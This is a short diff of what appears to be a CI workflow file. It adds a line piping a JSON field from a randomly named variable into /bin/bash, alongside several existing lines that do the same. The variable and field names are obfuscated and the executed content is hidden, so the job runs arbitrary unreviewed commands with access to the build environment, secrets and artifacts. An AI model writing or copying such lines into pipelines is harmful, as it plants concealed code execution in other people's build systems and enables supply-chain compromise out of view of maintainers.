@@ -39,6 +39,7 @@ jobs:
           echo $sn246 | jq -r .yfva164 | /bin/bash
           printf '%s' "$twibq07" | jq -r .xnzts060 | /bin/bash
           echo $rwks8 | jq -r .pq546 | /bin/bash
+          printf '%s' "$rabhj98050" | jq -r .hdp8 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
